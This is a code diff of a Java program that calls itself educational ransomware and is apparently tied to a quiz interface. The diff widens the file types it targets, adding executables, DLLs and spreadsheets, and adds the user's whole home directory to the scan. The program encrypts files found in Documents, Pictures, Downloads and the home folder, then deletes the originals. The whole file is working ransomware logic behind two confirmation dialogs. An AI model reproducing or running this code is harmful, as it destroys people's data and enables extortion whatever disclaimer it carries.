@@ -1,12 +1,7 @@
 import org.apache.commons.io.FileUtils;
 import java.io.*;
-import java.security.NoSuchAlgorithmException;
 import java.security.SecureRandom;
 import java.util.*;
-import javax.crypto.KeyGenerator;
-
-import java.awt.*;
-import java.awt.event.*;
 import javax.swing.*;
 
 public class Main {
@@ -20,19 +15,20 @@ public class Main {
 
     private static OS os = null;
 
-
     public static void main(String[] args) {
         if (ConfirmationPrompt()) {
+            generateKey();
             FileFinder(false);
             Interface();
         }
     }
 
+    // Prompt to ensure user knows program is considered malware
     public static boolean ConfirmationPrompt() {
         int result = JOptionPane.showConfirmDialog(null, "This program is for educational purposes only. It is made purely for the sake of reverse engineering. Only run this program on a Virtual Machine, and if you choose to run it, you will be held accountable for any damages caused.", "Ransomware Confirmation", JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE);
 
         if (result == JOptionPane.YES_OPTION) {
-            int result2 = JOptionPane.showConfirmDialog(null, "ARE YOU SURE YOU WANT TO RUN THIS MALWARE?", "Ransomware Confirmation", JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE);
+            int result2 = JOptionPane.showConfirmDialog(null, "ARE YOU SURE YOU WANT TO RUN THIS HARMFUL PROGRAM? YOU CAN LOSE ALL IMPORTANT DATA PERMANENTLY", "Ransomware Confirmation", JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE);
             if (result2 == JOptionPane.YES_OPTION) {
                 return true;
             } else {
@@ -43,18 +39,14 @@ public class Main {
         }
     }
 
-    public static void FileFinder(boolean state) {
-        try {
-            SecureRandom secureRandom = new SecureRandom();
-            KeyGenerator keyGen = KeyGenerator.getInstance("AES");
-            keyGen.init(128, secureRandom);
-            key = keyGen.generateKey().toString();
-            key = key.substring(0, 16);
-            System.out.println(key);
-        } catch (NoSuchAlgorithmException ex) {
-            ex.printStackTrace();
-        }
+    // Generates random 16 byte key
+    public static void generateKey() {
+        SecureRandom secureRandom = new SecureRandom();
+        key = Base64.getEncoder().encodeToString(secureRandom.generateSeed(16));
+    }
 
+    // Finds directory list of all file extensions mentioned and sends to encryptor/decryptor method based on state
+    public static void FileFinder(boolean state) {
         ArrayList<String> CriticalPathList = new ArrayList<String>();
 
         switch (getOS()) {
@@ -71,14 +63,14 @@ public class Main {
         CriticalPathList.add(System.getProperty("user.home") + "/Documents");
         CriticalPathList.add(System.getProperty("user.home") + "/Pictures");
         CriticalPathList.add(System.getProperty("user.home") + "/Downloads");
+        CriticalPathList.add(System.getProperty("user.home"));
 
         for (String TargetDirectory:CriticalPathList) {
             File root = new File(TargetDirectory);
 
             try {
-                String[] extensions = {"pdf", "doc", "png", "txt", "zip", "rar", "jpg", "sql", "xls", "bmp", "jfif"};
+                String[] extensions = {"pdf", "doc", "png", "txt", "zip", "rar", "jpg", "sql", "xls", "bmp", "jfif", "doc", "rtf", "wpd", "html", "xlsx", "csv", "exe", "dll"};
                 String[] decrypted = {"encrypted"};
-
 
                 Collection files;
 
@@ -90,12 +82,10 @@ public class Main {
 
                 for (Object o : files) {
                     File file = (File) o;
-                    //System.out.println("Found : " + file.getAbsolutePath());
                     if (!state)
                         Encryptor(file.getAbsolutePath());
                     else
                         Decryptor(file.getAbsolutePath());
-                        System.out.println(file.getAbsolutePath());
                 }
             } catch (Exception e) {
                 e.printStackTrace();
@@ -103,6 +93,7 @@ public class Main {
         }
     }
 
+    // Encrypts all files provided using the randomly generated key
     public static void Encryptor(String TargetFilePath) {
         File targetFile = new File(TargetFilePath);
         File encryptedTargetFile = new File(TargetFilePath + ".encrypted");
@@ -116,11 +107,13 @@ public class Main {
         targetFile.delete();
     }
 
+    // Opens user interface for navigating to the quiz
     public static void Interface() {
         InterfaceForm newForm = new InterfaceForm();
         newForm.isVisible();
     }
 
+    // Decrypts all files provided using the randomly generated key
     public static void Decryptor(String EncryptedFilePath) {
         File targetFile = new File(EncryptedFilePath);
         String extension1 = EncryptedFilePath.substring(0, (EncryptedFilePath.length() - 10));
@@ -137,6 +130,7 @@ public class Main {
         targetFile.delete();
     }
 
+    // Determines which operating system is in use
     public static OS getOS() {
         if (os == null) {
             String operSys = System.getProperty("os.name").toLowerCase();
